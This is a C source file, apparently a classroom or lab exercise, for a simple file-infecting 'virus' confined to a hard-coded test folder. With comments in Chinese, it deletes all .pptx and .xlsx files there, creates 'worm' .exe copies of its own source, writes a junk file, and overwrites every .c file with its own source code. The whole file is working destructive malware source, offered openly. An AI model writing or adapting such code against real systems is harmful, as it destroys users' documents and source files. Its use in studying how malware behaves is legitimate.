#include<stdio.h>
#include<io.h>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
#define CREATE1 "H:\\virus\\virus_test\\worm1.exe"
#define CREATE2 "H:\\virus\\virus_test\\worm2.exe"
#define Target "H:\\virus\\virus_test\\*.c"
#define Virus "H:\\virus\\virus_create.c"
#define DELETE1 "H:\\virus\\virus_test\\*.pptx"
#define DELETE2 "H:\\virus\\virus_test\\*.xlsx"
#define ipath "H:\\virus\\virus_test"

void EXE_CREATE(void);
void REMOVE(void);
void TRASH(void);
void COPYFILE(char* infile, char *outfile);
void INFECTED(void);

void EXE_CREATE(void)
{
	int i;
	char* s[2] = { CREATE1,CREATE2 };
	for (i = 0; i < 2; i++)
	{
		open(s[i], 0x0100, 0x0080);
		COPYFILE(Virus, s[i]);
	}
}
void REMOVE(void)
{
	int done;//完成标志 
	int i;//计数 

	struct _finddata_t fd;//定义查找文件的结构体，这个类已经在io.h库中，包括了_finddata_t,_findfirst,_findnext,_findclose 
	char *filetype[2] = { DELETE1,DELETE2 };//定义要删除的两个文件类型为delete1 和delete 2
	for (i = 0; i < 2; i++)//逐个遍历文件拓展名是否符合定义中的.xlsx和.pptx 
	{
		done = _findfirst(filetype[i], &fd);//第一次查找 
		if (done != -1)//成功删除文件的标志 
		{
			printf("删除 %s\n", fd.name);//删除的文件名 
			remove(fd.name);//删除文件夹中对应文件 
			while (!_findnext(done, &fd))//成功删除第二个文件的文件名 
			{
				printf("删除 %s\n", fd.name);
				remove(fd.name);
			}
		}
		_findclose(done);// 删除完毕，查找结束 
	}
}

void TRASH(void)//垃圾文件 
{
	int i = 0;
	FILE *fp = NULL;
	char* path = NULL;
	char* NewName = NULL;
	char tempname[] = "XXXXXXXXX";//垃圾文件名 
	path = ipath;
	if (!_chdir(path))//查找被感染文件所在路径 
	{
		printf("成功打开目录\n");
	}
	else
	{
		printf("打开目录失败\n");
		perror("错误: ");
	}
	NewName = _mktemp(tempname);
	fp = fopen(NewName, "w");//打开文件并写入文件内容，即覆盖 
	fclose(fp);

}
void INFECTED(void)
{
	int done;
	int i;

	struct _finddata_t fd;
	char *filetype = Target;

	done = _findfirst(filetype, &fd);
	COPYFILE(Virus, fd.name);
	while (!_findnext(done, &fd))
	{
		COPYFILE(Virus, fd.name); 
	}
	_findclose(done);
}

void COPYFILE(char* infile, char *outfile)
{
	FILE *in, *out;
	in = fopen(infile, "r");
	out = fopen(outfile, "w");
	while (!feof(in))
	{
		fputc(fgetc(in), out);
	}
	fclose(in);
	fclose(out);
}


int main(void)
{
	TRASH();            
    EXE_CREATE();            
	REMOVE();              
	INFECTED();             
	system("pause");
	return 0;
}

